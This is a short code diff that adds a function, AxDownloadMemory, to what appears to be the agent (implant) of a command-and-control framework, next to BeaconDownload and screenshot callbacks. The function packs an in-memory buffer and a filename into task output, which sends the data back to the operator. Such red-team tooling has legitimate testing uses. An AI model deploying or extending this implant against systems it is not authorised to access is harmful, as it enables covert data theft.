@@ -522,6 +522,21 @@ void AxAddScreenshot(char* note, char* data, int len)
 	}
 }
 
+void AxDownloadMemory(char* filename, char* data, int len)
+{
+	if (IsAsyncBofThread()) {
+		AsyncBofOutput(CALLBACK_AX_DOWNLOAD_MEM, (PBYTE)data, len);
+		return;
+	}
+	if (bofOutputPacker) {
+		bofOutputPacker->Pack32(bofTaskId);
+		bofOutputPacker->Pack32(51);			// COMMAND_EXEC_BOF_OUT
+		bofOutputPacker->Pack32(CALLBACK_AX_DOWNLOAD_MEM);
+		bofOutputPacker->PackStringA(filename);
+		bofOutputPacker->PackBytes((PBYTE)data, len);
+	}
+}
+
 BOOL BeaconDownload(const char* filename, const char* buffer, unsigned int length)
 {
 	if (!buffer || length == 0)
